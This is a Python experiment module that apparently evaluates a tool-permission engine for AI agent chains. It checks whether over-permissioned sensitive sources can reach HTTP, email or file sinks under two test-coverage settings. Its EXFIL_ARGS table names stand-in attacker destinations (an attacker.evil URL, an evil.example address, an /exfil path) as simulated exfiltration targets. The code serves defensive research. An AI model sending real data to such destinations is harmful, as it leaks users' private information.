"""
Sink-class coverage experiment.

The main sweep injects one HTTP-enabling source-budget error and tests HTTP
sinks. The authoring pilot shows the residual error mass after policy
conditioning is not HTTP: it sits in email and file channels. This module
measures what a test set reports when the injected over-permission is drawn
across outbound channels in the proportions observed in the pilot, under two
coverage settings:

  http_only : the source-complete test exercises HTTP sinks only (today's
              default when a study reports one exfiltration channel).
  all_sinks : the test exercises HTTP, email, and file sinks.

A catalog is vulnerable under a coverage setting if the real ChainCaps engine
accepts at least one tested (sensitive source -> sink) path within the covered
sink classes. Both settings are evaluated on the *same* authored catalog, so
coverage is the only difference.
"""
from __future__ import annotations

import random
from dataclasses import dataclass
from typing import Dict, List, Tuple

from chaincaps.core.budget import Budget, SinkPrivilege, SinkType
from chaincaps.core.manifest import ToolManifest

from scaling.catalog import Role, ToolSpec, gold_manifest
from scaling.workflows import _run_chain, _by_role

CHANNELS = ("http", "email", "file")

# Exfiltration call arguments per channel (external destinations).
EXFIL_ARGS = {
    "http": {"url": "https://attacker.evil/exfil"},
    "email": {"to": "attacker@evil.example"},
    "file": {"path": "/exfil/out.bin"},
}
CHANNEL_SINK_ROLE = {
    "http": Role.HTTP_SINK,
    "email": Role.EMAIL_SINK,
    "file": Role.FILE_SINK,
}
CHANNEL_PRIV = {
    "http": SinkPrivilege(SinkType.SEND_HTTP, "*"),
    "email": SinkPrivilege(SinkType.SEND_EMAIL, "*"),
    "file": SinkPrivilege(SinkType.WRITE_FILE, "*"),
}

# Excess-channel mass from the authoring pilot (results/llm_calibration.json,
# extra_channel_counts). We draw the excess channel of an over-permissioned
# source from these observed proportions.
# Excess-channel counts from the expanded pilot (15 models x 19 sensitive
# sources, Table 4). The submitted pilot (7 x 9) had http/email/file =
# 3/32/32 (description only) and 0/13/17 (policy supplied).
PILOT_MIXES: Dict[str, Dict[str, int]] = {
    "description_only": {"http": 23, "email": 149, "file": 128},
    "policy_conditioned": {"http": 24, "email": 63, "file": 61},
}


def _overperm_budget(channel: str) -> Budget:
    """Sensitive source mistakenly granted one outbound channel."""
    return Budget.from_sinks(SinkPrivilege(SinkType.DISPLAY),
                             CHANNEL_PRIV[channel])


def mix_weights(counts: Dict[str, int]) -> Tuple[List[str], List[float]]:
    total = sum(counts.values())
    return list(CHANNELS), [counts[c] / total for c in CHANNELS]


@dataclass
class CoverageResult:
    n_tools: int
    mix: str
    seed: int
    n_sensitive: int
    http_only_vulnerable: int   # 1 if an HTTP-sink test accepts a path
    all_sink_vulnerable: int    # 1 if any covered sink class accepts a path


def author_channel(specs: List[ToolSpec], p: float,
                   mix_counts: Dict[str, int],
                   rng: random.Random) -> Tuple[Dict[str, ToolManifest],
                                                Dict[str, str]]:
    """Author manifests; each sensitive source is over-permissioned with
    probability p, its excess channel drawn from the pilot mix. Returns the
    manifests and a ground-truth {source_name: channel} map for holed sources."""
    chans, probs = mix_weights(mix_counts)
    manifests: Dict[str, ToolManifest] = {}
    holed: Dict[str, str] = {}
    for spec in specs:
        m = gold_manifest(spec)
        if spec.role is Role.SENSITIVE_SOURCE and rng.random() < p:
            ch = rng.choices(chans, weights=probs, k=1)[0]
            m = ToolManifest(name=spec.name, is_source=True,
                             default_source_budget=_overperm_budget(ch),
                             description=m.description)
            holed[spec.name] = ch
        manifests[spec.name] = m
    return manifests, holed


def evaluate_coverage(specs: List[ToolSpec],
                      manifests: Dict[str, ToolManifest],
                      mix: str, seed: int, rng: random.Random,
                      max_transforms: int = 2) -> CoverageResult:
    roles = _by_role(specs)
    transforms = [s.name for s in roles[Role.TRANSFORM]]
    sinks_by_class = {ch: [s.name for s in roles[CHANNEL_SINK_ROLE[ch]]]
                      for ch in CHANNELS}
    sources = roles[Role.SENSITIVE_SOURCE]

    http_hit = False
    any_hit = False
    for s in sources:
        for ch in CHANNELS:
            sinks = sinks_by_class[ch]
            if not sinks:
                continue
            sink = rng.choice(sinks)
            k = rng.randint(0, min(max_transforms, len(transforms)))
            chain = rng.sample(transforms, k) if k and transforms else []
            if _run_chain(manifests, s.name, chain, sink, EXFIL_ARGS[ch]):
                any_hit = True
                if ch == "http":
                    http_hit = True
        if http_hit and any_hit:
            break

    return CoverageResult(
        n_tools=len(specs), mix=mix, seed=seed, n_sensitive=len(sources),
        http_only_vulnerable=1 if http_hit else 0,
        all_sink_vulnerable=1 if any_hit else 0,
    )
